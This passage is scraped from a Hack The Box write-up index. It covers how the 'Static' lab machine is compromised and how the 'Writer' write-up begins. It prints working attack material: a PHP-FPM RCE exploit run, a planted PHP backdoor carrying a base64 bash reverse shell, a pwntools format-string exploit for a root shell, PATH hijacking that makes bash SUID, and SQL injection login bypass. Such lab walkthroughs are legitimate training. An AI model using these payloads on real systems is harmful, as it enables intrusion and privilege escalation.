bytes 38947 (38.9 KB)  TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 So we have the following network setup:\nWe can connect to the pki, which has IP address 192.168.254.3. To perform a port scan we can use nmap and proxychains after configuring SSH dynamic port forwarding:\n$ ssh -fND 9050 -i id_rsa www-data@172.20.0.10 # proxychains4 -q nmap -sS -p- -vvv -Pn -n 192.168.254.3 Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.92 ( https://nmap.org ) Initiating SYN Stealth Scan Scanning 192.168.254.3 [65535 ports] SYN Stealth Scan Timing: About 0.30% done Stats: 0:01:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 0.39% done Stats: 0:02:12 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 0.50% done ^C The idea was nice, but the port scan took ages and nmap with proxychains does not work well sometimes (it might report false positives or not report open ports).\nLet\u0026rsquo;s use a simple Bash script and execute it from the web machine to get less latency:\n#!/usr/bin/env bash  for p in `seq 1 65535`; do \techo -ne \u0026#34;Trying $p\\r\u0026#34; \ttimeout 1 echo 2\u0026gt;/dev/null \u0026gt; /dev/tcp/192.168.254.3/$p \u0026amp;\u0026amp; echo \u0026#34;Port: $pOPEN\u0026#34; \u0026amp; done; wait We can transfer the script using a Python web server and wget, since the machine does not have vim or nano.\nwww-data@web:~$ cd /tmp www-data@web:/tmp$ wget 172.30.0.9/port_scan.sh www-data@web:/tmp$ bash port_scan.sh Port: 80 OPEN In less than 5 minutes we have all the results. Only port 80 (HTTP) is open on pki, which will appear after a few seconds as a result of the scan.\nLet\u0026rsquo;s do a local port forwarding using SSH (use ENTER + ~C to exit temporarily from the current SSH session and get the ssh\u0026gt; prompt):\nwww-data@web:/tmp$ ssh\u0026gt; -L 8080:192.168.254.3:80 Forwarding port. www-data@web:/tmp$ We have the following HTTP response from pki:\n$ curl 127.0.0.1:8080 -i HTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Wed, 10 Dec 2021 22:22:22 GMT Content-Type: text/html; charset=UTF-8 Transfer-Encoding: chunked Connection: keep-alive X-Powered-By: PHP-FPM/7.1  batch mode: /usr/bin/ersatool create|print|revoke CN The response is weird because it is showing like a \u0026ldquo;help panel\u0026rdquo; from a binary file called ersatool. Let\u0026rsquo;s apply some fuzzing and discover more routes:\n$ ffuf -w $WORDLISTS/dirb/common.txt -u http://127.0.0.1:8080/FUZZ  [Status: 200, Size: 53, Words: 5, Lines: 2] index.php [Status: 200, Size: 50022, Words: 6940, Lines: 305] uploads [Status: 301, Size: 194, Words: 7, Lines: 8] There is an /uploads folder, but directory listing is disabled.\nExploiting another internal server From the HTTP response headers shown before, we get that the server is running PHP-FPM/7.1. There is an exploit for this technology, show-cased here (CVE-2019-11043).\nThe exploit consists of a Go project that exposes a web-shell on the victim. Let\u0026rsquo;s build the project:\n$ git clone https://github.com/neex/phuip-fpizdam $ cd phuip-fpizdam $ go build --ldflags=\u0026#39;-s -w\u0026#39; . go: downloading github.com/spf13/cobra v0.0.5 go: downloading github.com/spf13/pflag v1.0.3 $ upx phuip-fpizdam After reading the basic information about the exploit, we can execute it like this:\n$ ./phuip-fpizdam http://127.0.0.1:8080/index.php Base status code is 200 Status code 502 for qsl=1765, adding as a candidate The target is probably vulnerable. Possible QSLs: [1755 1760 1765] Attack params found: --qsl 1755 --pisos 38 --skip-detect Trying to set \u0026#34;session.auto_start=0\u0026#34;... Detect() returned attack params: --qsl 1755 --pisos 38 --skip-detect \u0026lt;-- REMEMBER THIS Performing attack using php.ini settings... Success! Was able to execute a command by appending \u0026#34;?a=/bin/sh+-c+\u0026#39;which+which\u0026#39;\u0026amp;\u0026#34; to URLs Trying to cleanup /tmp/a... Done! And as it says in the output, we have now a query parameter where to put our system commands:\n$ curl \u0026#34;http://127.0.0.1:8080/index.php?a=/bin/sh+-c+\u0026#39;which+which\u0026#39;\u0026amp;\u0026#34; /usr/bin/which \u0026lt;br /\u0026gt; \u0026lt;b\u0026gt;Warning\u0026lt;/b\u0026gt;: Cannot modify header information - headers already sent by (output started at /tmp/a:1) in \u0026lt;b\u0026gt;/var/www/html/index.php\u0026lt;/b\u0026gt; on line \u0026lt;b\u0026gt;2\u0026lt;/b\u0026gt;\u0026lt;br  /\u0026gt; batch mode: /usr/bin/ersatool create|print|revoke CN One thing to notice is that the command does not always work. We need to send the request around three or four times to execute the command.\nUsing this RCE, we can make some basic enumeration of the system:\n$ curl \u0026#34;http://127.0.0.1:8080/index.php?a=/bin/sh+-c+\u0026#39;whoami\u0026#39;\u0026amp;\u0026#34; www-data \u0026lt;br /\u0026gt; \u0026lt;b\u0026gt;Warning\u0026lt;/b\u0026gt;: Cannot modify header information - headers already sent by (output started at /tmp/a:1) in \u0026lt;b\u0026gt;/var/www/html/index.php\u0026lt;/b\u0026gt; on line \u0026lt;b\u0026gt;2\u0026lt;/b\u0026gt;\u0026lt;br  /\u0026gt; batch mode: /usr/bin/ersatool create|print|revoke CN $ curl \u0026#34;http://127.0.0.1:8080/index.php?a=/bin/sh+-c+\u0026#39;ls+-la\u0026#39;\u0026amp;\u0026#34; total 16 drwxr-xr-x 3 root root 4096 Apr 4 2020 . drwxr-xr-x 3 root root 4096 Mar 27 2020 .. -rw-r--r-- 1 root root 174 Apr 4 2020 index.php drwxr-xr-x 2 www-data www-data 4096 Mar 27 2020 uploads \u0026lt;br /\u0026gt; \u0026lt;b\u0026gt;Warning\u0026lt;/b\u0026gt;: Cannot modify header information - headers already sent by (output started at /tmp/a:1) in \u0026lt;b\u0026gt;/var/www/html/index.php\u0026lt;/b\u0026gt; on line \u0026lt;b\u0026gt;2\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt; batch mode: /usr/bin/ersatool create|print|revoke CN However, it will be more useful to have a proper command shell. For this, I decided to add a PHP file into /uploads with a system command that sends a reverse shell.\nNotice that pki does not have connectivity to the attacker machine. Hence, the reverse shell will be sent to web (192.168.254.2). Once in web, the traffic will be redirected to the attacker machine (172.30.0.9) using port forwarding with chisel.\n$ echo -n \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.254.2/4444 0\u0026gt;\u0026amp;1\u0026#39; | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi80NDQ0ICAwPiYx The PHP file will be called b4ckd0or.php and will have this content:\n\u0026lt;?php system(\u0026#34;echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi80NDQ0ICAwPiYx|base64 -d|bash\u0026#34;); ?\u0026gt;Basic enumeration tells us that there is no nc, curl or wget. The best way to write a file is using echo and redirecting output. Take care about URL encoding as well:\n$ curl \u0026#34;http://127.0.0.1:8080/index.php?a=echo+\u0026#39;\u0026lt;?php+system(\\\u0026#34;echo+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi80NDQ0ICAwPiYx|base64+-d|bash\\\u0026#34;);+?\u0026gt;\u0026#39;+\u0026gt;+uploads/b4ckd0or.php;echo+asdf\u0026amp;\u0026#34; asdf Warning: Cannot modify header information - headers already sent by (output started at /tmp/a:1) in /var/www/html/index.php on line 2 batch mode: /usr/bin/ersatool create|print|revoke CN Notice how I added echo asdf to know when the command was actually executed (remember that until the third or fourth attempt, the command does not work).\nNow we need to transfer chisel to the web machine (using a Python HTTP server from the attacker machine):\nwww-data@web:/tmp$ wget 172.30.0.9/chisel www-data@web:/tmp$ mv chisel .chisel www-data@web:/tmp$ chmod +x .chisel The web machine will be the server, listening on port 1337:\nwww-data@web:/tmp$ ./.chisel server -p 1337 --reverse server: Reverse tunnelling enabled server: Fingerprint hQIxqO8XgdRQ0l9fMNAkw3PmdG9Flu7YvQeJtgZ9o2E= server: Listening on http://0.0.0.0:1337 The attacker machine will connect to the server (172.20.0.10:1337) and tell them to forward everything that arrives at 192.168.254.2:4444 (web machine) to port 4444 (attacker machine):\n$ ./chisel client 172.20.0.10:1337 R:192.168.254.2:4444:0.0.0.0:4444 client: Connecting to ws://172.20.0.10:1337 client: Connected (Latency 82.064375ms) The output of the server will clarify the connection:\nwww-data@web:/tmp$ ./.chisel server -p 1337 --reverse server: Reverse tunnelling enabled server: Fingerprint hQIxqO8XgdRQ0l9fMNAkw3PmdG9Flu7YvQeJtgZ9o2E= server: Listening on http://0.0.0.0:1337 server: session#1: tun: proxy#R:192.168.254.2:4444=\u0026gt;0.0.0.0:4444: Listening Now we can request the /uploads/b4ckd0or.php file we created and gain a proper reverse shell on the pki machine:\n$ curl http://127.0.0.1:8080/uploads/b4ckd0or.php $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 127.0.0.1. Ncat: Connection from 127.0.0.1:59809. bash: cannot set terminal process group (11): Inappropriate ioctl for device bash: no job control in this shell www-data@pki:~/html/uploads$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@pki:~/html/uploads$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444  reset xterm www-data@pki:~/html/uploads$ export TERM=xterm www-data@pki:~/html/uploads$ export SHELL=bash www-data@pki:~/html/uploads$ stty rows 50 columns 158 Finding a Format String vulnerability We are www-data user. This pki machine is a Docker container (because it contains a .dockerenv and has only a few commands):\nwww-data@pki:~/html/uploads$ ls -a / . .dockerenv boot entry.sh home lib64 mnt php-src root sbin sys usr .. bin dev etc lib media opt proc run srv tmp var If we enumerate system capabilities, we see that the ersatool binary has cap_setuid+eip:\nwww-data@pki:~/html/uploads$ getcap -r / 2\u0026gt;/dev/null /usr/bin/ersatool = cap_setuid+eip This means that in some points of the program the binary is allowed to perform elevated actions (as root). Let\u0026rsquo;s check if there are more files related to this binary:\nwww-data@pki:~/html/uploads$ find / -name \\*ersatool\\* 2\u0026gt;/dev/null /usr/src/ersatool.c /usr/bin/ersatool And we have the source code. This is nice to have because we can omit some reverse engineering tasks.\nThe binary is used to generate the VPN for the users. Maybe it needs to run as root during some tasks to read private keys, for example.\nAfter having a look at the source code, we discover a Format String vulnerability:\nvoid printCN(char *cn, int i) {  char fn[100];  char buffer[100];   if (i == 1) {  printf(\u0026#34;print-\u0026gt;CN=\u0026#34;);  fflush(stdout);  memset(buffer, 0, sizeof(buffer));  read(0, buffer, sizeof(buffer));  } else {  memset(buffer, 0, sizeof(buffer));  strncat(buffer, cn, sizeof(buffer));  }   if (!strncmp(\u0026#34;\\n\u0026#34;, buffer, 1)) { return; }   do {  strncpy(fn, OUTPUT_DIR, sizeof(fn));  strncat(fn, \u0026#34;/\u0026#34;, sizeof(fn) - strlen(fn));  strncat(fn, strtok(basename(buffer), \u0026#34;\\n\u0026#34;), sizeof(fn) - strlen(fn));  strncat(fn, EXT, sizeof(fn) - strlen(fn));  printf(buffer); //checking buffer content  filePrint(fn);   if (i == 1) {  printf(\u0026#34;\\nprint-\u0026gt;CN=\u0026#34;);  fflush(stdout);  memset(buffer,0,sizeof(buffer));  read(0,buffer,sizeof(buffer));  }  } while (strncmp(\u0026#34;\\n\u0026#34;, buffer, 1) \u0026amp;\u0026amp; i == 1); } Can you see it? This is the vulnerable line:\nprintf(buffer); //checking buffer content The variable buffer comes from direct user input, so we have control over the variable.\nFormat String vulnerabilities are really dangerous because we can read arbitrary data from the memory and even write and modify data from the memory to gain RCE.\nFunction printf uses format strings using special characters to print different type of data. For example:\nprintf(\u0026#34;%d\\n\u0026#34;, 1337); // Prints: 1337 printf(\u0026#34;%s\\n\u0026#34;, \u0026#34;7Rocky\u0026#34;); // Prints: 7Rocky printf(\u0026#34;%x\\n\u0026#34;, 0xACDC); // Prints: acdc The %n format string writes the number of bytes written until its occurrence in the address given as argument preceding the format strings.\nThe issue is having control over the format string, because we can do the following:\nwww-data@pki:~/html/uploads$ ersatool batch mode: /usr/bin/ersatool create|print|revoke CN www-data@pki:~/html/uploads$ ersatool print %x ff35015f[!] ERR reading /opt/easyrsa/clients/%x.ovpn! www-data@pki:~/html/uploads$ ersatool # print print-\u0026gt;CN=%x ffe4827f[!] ERR reading /opt/easyrsa/clients/%x.ovpn! ^C The values ff35015f and ffe4827f are just values from the stack, we are leaking memory data.\nNotice that the program can be used in interactive mode.\nWe can fuzz a little more using Python and check where the AAAA before the format strings are:\nwww-data@pki:~/html/uploads$ ersatool print $(python3 -c \u0026#39;print(\u0026#34;AAAA\u0026#34; + \u0026#34;%x.\u0026#34; * 100)\u0026#39;) AAAAf7b2915f.ab89b864.f7b2915f.0.78252e78.da4b5a98.ab89be4d.41414141.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.ab89b830.74706f2f.61737279.73746e65.2e782541.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.[!] ERR reading /opt/easyrsa/clients/AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.! As showm, 41414141 (AAAA in hexadecimal ASCII values) is on the eighth position (offset 8). This will be important for the exploitation process.\nNetwork setup for exploitation First, we will need to setup the network environment to have bidirectional connectivity between pki and the attacker machine.\nOne way is already setup:\npki =\u0026gt; 192.168.254.2:4444 (web) =\u0026gt; 172.30.0.9:4444 (attacker) The other way will be this:\nattacker =\u0026gt; 127.0.0.1:1234 =\u0026gt; (web) =\u0026gt; 192.168.254.3:1234 (pki) These will be the resulting connections:\nFor this purpose, we can use SSH port forwarding as before (ENTER + ~C):\nwww-data@web:/tmp$ ssh\u0026gt; -L 1234:192.168.254.3:1234 Forwarding port. www-data@web:/tmp$ Now we can easily transfer ersatool and ersatool.c to the attacker machine using Python (fortunately, pki has python3 installed):\nwww-data@pki:~/html/uploads$ cd / www-data@pki:~/$ python3 -m http.server 1234 Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ... $ wget http://127.0.0.1:1234/usr/bin/ersatool $ wget http://127.0.0.1:1234/usr/src/ersatool.c To build the exploit, we will also need the Glibc library:\nwww-data@pki:/$ ldd /usr/bin/ersatool  linux-vdso.so.1 (0x00007fff7f1f4000)  libc.so.6 =\u0026gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9381921000)  /lib64/ld-linux-x86-64.so.2 (0x00007f9381d12000) $ wget http://127.0.0.1:1234/lib/x86_64-linux-gnu/libc.so.6 Finally, since it is a command line program, we will need to use socat in order to redirect our payloads that come from a TCP connection to the running binary.\nWe can transfer socat from the attacker machine to pki using this Python code:\nfrom urllib.request import urlopen  f = open(\u0026#39;./socat\u0026#39;, \u0026#39;wb\u0026#39;) f.write(urlopen(\u0026#39;http://192.168.254.2:4444/socat\u0026#39;).read()) f.close() The attacker machine will have a HTTP web server on port 4444 (remember the connection setup):\n$ python3 -m http.server 4444 Serving HTTP on :: port 4444 (http://[::]:4444/) ... The Python code for pki in a \u0026ldquo;one-liner\u0026rdquo; is like this:\nwww-data@pki:/$ cd /tmp www-data@pki:/tmp$ python3 -c \u0026#39;from urllib.request import urlopen; f = open(\u0026#34;./socat\u0026#34;, \u0026#34;wb\u0026#34;); f.write(urlopen(\u0026#34;http://192.168.254.2:4444/socat\u0026#34;).read()); f.close()\u0026#39; www-data@pki:/tmp$ file socat socat: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped Now we can launch socat and start working from the attacker machine from 127.0.0.1:1234:\nwww-data@pki:/tmp$ chmod +x socat www-data@pki:/tmp$ ./socat tcp-l:1234,reuseaddr,fork EXEC:/usr/bin/ersatool $ nc 127.0.0.1 1234 # print print-\u0026gt;CN=%x f7410e5f[!] ERR reading /opt/easyrsa/clients/%x.ovpn! Format String exploitation This is the basic information about the binary:\n$ file ersatool ersatool: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=961368a18afcdeccddd1f423353ff104bc09e6ae, not stripped $ checksec --file ersatool  Arch: amd64-64-little  RELRO: Partial RELRO  Stack: No canary found  NX: NX enabled  PIE: PIE enabled  It is a 64-bit ELF binary. It has NX enabled, which means that the stack is non-executable. It has PIE enabled, which means that the base address of the proper binary is randomized (ASLR) so that it is reset every time the program restarts (the addresses of the functions are computed as an offset plus the base address). Moreover, addresses of functions belonging to Glibc will also suffer from ASLR, because it is enabled:  www-data@pki:/tmp$ cat /proc/sys/kernel/randomize_va_space 2 We need to perform the following tasks to get RCE:\n Find the offset of the format string. Leak an address of a function of the binary using the format string. Compute the binary base address. Leak an address of a function of Glibc using the format string. Compute Glibc base address. Change __malloc_hook function to a one gadget shell in Glibc using the format string. Trigger malloc by allocating a large amount of memory.  Task 1: Already done, the format string offset is 8.\nTask 2: To leak an address we must use format strings like %x or %p (both will print the hexadecimal value of an address, but the second will prepend 0x). However, instead of putting a lot of format strings, we can take the position we desire using %i$p, where i is the position. This time, as it is a 64-bit binary, we need to use %lx or %lp.\nUsing this idea, let\u0026rsquo;s build a simple Python script using pwntools to dump the first 60 values from the stack:\nfrom pwn import *  p = remote(\u0026#39;127.0.0.1\u0026#39;, 1234)  def get_value(i):  p.sendlineafter(b\u0026#39;print-\u0026gt;CN=\u0026#39;, f\u0026#39;%{i}$lp\u0026#39;.encode())  data = p.recvline()  data = data[:data.index(b\u0026#39;[!] ERR\u0026#39;)]  print(i, data.decode())  return int(data.decode(), 16)  p.sendlineafter(b\u0026#39;# \u0026#39;, b\u0026#39;print\u0026#39;)  for i in range(1, 61):  get_value(i) $ python3 exploit.py [+] Opening connection to 127.0.0.1 on port 1234: Done 1 0x5615109d815f 2 0x7ffdc8e5489a 3 0x5615109d815f 4 0x4a 5 0x696c632f61737279 6 0x1109d41d0 7 (nil) 8 0x706c243825 9 (nil) ... 19 (nil) 20 0x561500000000 21 0x7f4a39c0bf51 22 0x7361652f74706f2f 23 0x696c632f61737279 24 0x3432252f73746e65 25 0x6e70766f2e706c24 26 (nil) ... 33 (nil) 34 0x7f4a00000000 35 0x7f4a39bfd87d 36 (nil) 37 (nil) 38 0x7ffdc8e54940 39 0x5615109d4f83 40 0x7ffdc8e54a28 41 0x100000000 42 0x5615109d5070 43 0xa746e697270 44 (nil) 45 0x100000000 46 0x5615109d5070 47 0x7f4a39ba0b97 48 0x2000000000 49 0x7ffdc8e54a28 50 0x100000000 51 0x5615109d4e5b 52 (nil) 53 0xcc040442782a621f 54 0x5615109d41d0 55 0x7ffdc8e54a20 56 (nil) 57 (nil) 58 0x9fd5b4b24a6a621f 59 0x9eba560cce54621f 60 0x7ffd00000000 Bypassing ASLR is relatively simple, since the randomized base address always ends on three hexadecimal zeros. Hence, if we know the last three hexadecimal digits of an offset, we can easily identify the real address.\nLet\u0026rsquo;s take the offset of the main function:\n$ readelf -s ersatool | grep \u0026#39; main\u0026#39;  86: 0000000000001e5b 524 FUNC GLOBAL DEFAULT 14 main If we have a look at the values above, we discover that position 51 is 0x5615109d4e5b, it ends with e5b. Then, we have found a way to leak the real address of main using %51$lp as a format string:\nmain_addr = get_value(51) print(\u0026#39;Address of main():\u0026#39;, hex(main_addr)) Task 3: The base address of the binary is likely to be 0x5615109d4e5b - 0x1e5b = 0x5615109d3000 (it will be different on every execution of the program):\nelf = context.binary = ELF(\u0026#39;./ersatool\u0026#39;, checksec=False) libc = ELF(\u0026#39;./libc.so.6\u0026#39;, checksec=False)  elf.address = main_addr - elf.symbols.main print(\u0026#39;Binary base address:\u0026#39;, hex(elf.address)) Now the process is kind of standard in Format String exploitation.\nTask 4: To leak an address of Glibc, we must use the Global Offset Table (GOT). This table is part of the binary and contains the addresses of the functions that can be used by the binary (namely, printf, strncat, fgets\u0026hellip;).\nThe addresses of the GOT are known because we have their offsets and the base address of the binary. We can use the following payload to print the address of printf (for example) in Glibc:\nleak = b\u0026#39;%9$s\u0026#39;.ljust(8, b\u0026#39;\\0\u0026#39;) + p64(elf.got.printf) p.sendlineafter(b\u0026#39;print-\u0026gt;CN=\u0026#39;, leak) data = p.recvline() data = data[:data.index(b\u0026#39;[!] ERR\u0026#39;)]  printf_addr = u64(data.ljust(8, b\u0026#39;\\0\u0026#39;)) print(\u0026#39;Address of printf():\u0026#39;, hex(printf_addr)) Because strings in C work as pointers, if we put an address of GOT into a format string to print the content of a string, what will be printed is the address pointed by the value of the GOT address.\nNotice that we are trying to leak %9$s, which will be the data inside address printf at GOT, which comes right after the format string (recall that the format string offset is 8).\nIf all works correctly, we will have the real address of printf in Glibc.\nTask 5: The base address of Glibc is computed the same way as the binary base address. We only subtract the offset from the real address. In addition, we need to verify that the base address ends in 000 hexadecimal digits.\nlibc.address = printf_addr - libc.symbols.printf print(\u0026#39;Glibc base address:\u0026#39;, hex(libc.address)) Task 6: Now we need to write to an address in memory. The best way to gain code execution in this type of situations is overriding the address of __malloc_hook inside Glibc to execute a one gadget shell.\nGadgets are just lines of assembly code that perform a certain operation. They are useful in Buffer Overflow exploitation using Return Oriented Programming (ROP) to bypass NX (also known as DEP).\nThis time, we can search for a gadget that executes /bin/sh. They are commonly found inside Glibc. Using one_gadget we can get some potential gadgets:\n# gem install one_gadget $ one_gadget libc.so.6 0x4f2c5 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x40, environ) constraints:  rsp \u0026amp; 0xf == 0  rcx == NULL 0x4f322 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x40, environ) constraints:  [rsp+0x40] == NULL 0x10a38c execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x70, environ) constraints:  [rsp+0x70] == NULL We can use 0x4f322, for example. Now we can easily override __malloc_hook using pwntools (they provide a magic function called fmtstr_payload that does all the work, specifying the offset, the address and the value to write):\none_gadget_shell = libc.address + 0x4f322  payload = fmtstr_payload(  offset,  {libc.sym.__malloc_hook: one_gadget_shell},  write_size=\u0026#39;short\u0026#39; )  p.sendlineafter(b\u0026#39;print-\u0026gt;CN=\u0026#39;, payload) p.recv() Task 7: The need to override __malloc_hook is because now we are going to send %10000$c. This task will require some memory space, so the binary will call malloc. However, __malloc_hook will be executed before. Since it has been modified, instead of calling malloc, the program will spawn a shell (/bin/sh):\np.sendlineafter(b\u0026#39;print-\u0026gt;CN=\u0026#39;, b\u0026#39;%10000$c\u0026#39;) p.interactive() Finally, we can execute the exploit and get a shell as root (due to the capabilities set on the binary):\n$ python3 exploit.py [+] Opening connection to 127.0.0.1 on port 1234: Done Offset: 8 51 0x558d4b23fe5b Address of main(): 0x558d4b23fe5b Binary base address: 0x558d4b23e000 GOT printf(): 0x558d4b243058 Address of printf(): 0x7f33d1794e80 Glibc base address: 0x7f33d1730000 Address of __malloc_hook(): 0x7f33d1b1bc30 [*] Switching to interactive mode $ whoami root $ cat /root/root.txt b3298f99ac5999202090829ed5fa9fb6 The full exploit can be found here: exploit.py (detailed explanation here).\nPrivilege escalation alternative Despite Format String exploitation is much cooler, there is an easier and faster way to escalate privileges. The idea is that ersatool can create .ovpn files. Maybe it is using some other binary behind the scenes.\nTo check all the processes running when creating a .ovpn file, one could use pspy. After that, we see that the binary is using openssl.\nBut, the nuance is that the progam is called as a relative path. Hence, the binary is vulnerable to PATH hijacking. We can create a malicious openssl executable inside /tmp and then add /tmp to the PATH environment variable:\nwww-data@pki:/tmp$ echo -e \u0026#39;#!/bin/bash\\nchmod 4755 /bin/bash\u0026#39; \u0026gt; openssl www-data@pki:/tmp$ cat openssl #!/bin/bash chmod 4755 /bin/bash www-data@pki:/tmp$ chmod +x openssl www-data@pki:/tmp$ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin www-data@pki:/tmp$ export PATH=/tmp:$PATH www-data@pki:/tmp$ echo $PATH /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin www-data@pki:/tmp$ ls -l /bin/bash -rwxr-xr-x 1 root root 1113504 Jun 6 2019 /bin/bash The malicious openssl will add the SUID bit to /bin/bash. If we use ersatool create, the malicious openssl will be executed:\nwww-data@pki:/tmp$ ersatool create xD ... www-data@pki:/tmp$ ls -l /bin/bash -rwsr-xr-x 1 root root 1113504 Jun 6 2019 /bin/bash And we gain access as root:\nwww-data@pki:/tmp$ bash -p bash-4.4# cat /root/root.txt b3298f99ac5999202090829ed5fa9fb6 ","image":"/images/HTB/Static/Static.png","permalink":"https://7rocky.github.io/en/htb/static/","section":"htb","summary":"Hack The Box. Linux. Hard machine. This machine contains a website that exposes a corrupted Gzip file that must be patched to get a TOTP key and download a VPN file. Then there are some PHP vulnerable services that can be compromised and get to an internal server that contains a binary executable file having a Format String vulnerability. Deep knowledge about pivoting and port forwarding techniques, network enumeration and PHP exploitation, as well as Format String exploitation are needed to compromise this machine. This write-up uses a custom Ruby script to automate the process of downloading the VPN file, a Python script gain RCE over a PHP web server and another Python script to exploit a binary using Format String","time":27,"title":"Static"},{"contents":"  OS: Linux   Difficulty: Medium   IP Address: 10.10.11.101   Release: 31 / 07 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.11.101 -p 22,80,139,445 Nmap scan report for 10.10.11.101 Host is up (0.050s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA) | 256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA) |_ 256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Story Bank | Writer.HTB 139/tcp open netbios-ssn Samba smbd 4.6.2 445/tcp open netbios-ssn Samba smbd 4.6.2 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Host script results: |_clock-skew: 13m06s |_nbstat: NetBIOS name: WRITER, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: |_ start_date: N/A  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 14.60 seconds This machine has ports 22 (SSH), 80 (HTTP), 139 and 445 (SMB) open.\nWeb enumeration If we go to http://10.10.11.101 we will see a blog like this:\nThe blog contains some posts, but nothing interesting at all. We can use gobuster to apply fuzzing and enumerate some routes:\n$ gobuster dir -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -q -u http://10.10.11.101 /contact (Status: 200) [Size: 4905] /about (Status: 200) [Size: 3522] /static (Status: 301) [Size: 313] [--\u0026gt; http://10.10.11.101/static/] /logout (Status: 302) [Size: 208] [--\u0026gt; http://10.10.11.101/] /dashboard (Status: 302) [Size: 208] [--\u0026gt; http://10.10.11.101/] /administrative (Status: 200) [Size: 1443] /server-status (Status: 403) [Size: 277] Here we can see a route called /administrative:\nWe can try some common default credentials (admin:admin, root:password, etc.), but none of them work.\nFinding a SQL injection The login form seen at /administrative is vulnerable to SQL injection (SQLi). Using a simple SQLi payload (namely: ' or 1=1-- -) we bypass authentication and enter the dashboard panel:\nWe can exploit SQLi to dump all the database contents. Notice that it is a Boolean-based blind SQLi (if the server responds with an error, then the SQL query has returned false; whereas if the server ends successfully, then the SQL query has returned true):\n$ curl 10.10.11.101/administrative -sd \u0026#34;uname=\u0026#39; or 1=2-- -\u0026amp;password=x\u0026#34; | grep error  \u0026lt;p class=\u0026#34;error\u0026#34; style=\u0026#34;color:red\u0026#34;\u0026gt;\u0026lt;strong style=\u0026#34;color:red\u0026#34;\u0026gt;Error:\u0026lt;/strong\u0026gt; Incorrect credentials supplied \u0026lt;/p\u0026gt; $ curl 10.10.11.101/administrative -sd \u0026#34;uname=\u0026#39; or 1=1-- -\u0026amp;password=x\u0026#34; | grep error Using this fact, we can dump the contents of the database character by character, so that we iterate over the printable ASCII characters until we find the correct one for a given position of a given field. That\u0026rsquo;s why it is recommended to use an automated script or a tool like sqlmap to extract all the data easily.\nExploiting the SQLi with a custom Python script called sqli.py that uses Binary Search, we can enumerate some fields of the tables of the database (detailed explanation here).\nHere there are some contents in JSON format (table stories and columns ganalitics and date_created where excluded because they contain a lot of useless data):\n$ python3 sqli.py {  \u0026#34;writer\u0026#34;: {  \u0026#34;site\u0026#34;: {  \u0026#34;id\u0026#34;: [  \u0026#34;1\u0026#34;  ],  \u0026#34;title\u0026#34;: [  \u0026#34;Story Bank\u0026#34;  ],  \u0026#34;description\u0026#34;: [  \u0026#34;This is a site where I publish my own and others stories\u0026#34;  ],  \u0026#34;logo\u0026#34;: [  \u0026#34;/img/logo.png\u0026#34;  ],  \u0026#34;favicon\u0026#34;: [  \u0026#34;/img/favicon.ico\u0026#34;  ],  \u0026#34;ganalytics\u0026#34;: []  },  \u0026#34;stories\u0026#34;: {},  \u0026#34;users\u0026#34;: {  \u0026#34;id\u0026#34;: [  \u0026#34;1\u0026#34;  ],  \u0026#34;username\u0026#34;: [  \u0026#34;admin\u0026#34;  ],  \u0026#34;password\u0026#34;: [  \u0026#34;118e48794631a9612484ca8b55f622d0\u0026#34;  ],  \u0026#34;email\u0026#34;: [  \u0026#34;admin@writer.htb\u0026#34;  ],  \u0026#34;status\u0026#34;: [  \u0026#34;Active\u0026#34;  ],  \u0026#34;date_created\u0026#34;: []  }  } } There is a hashed 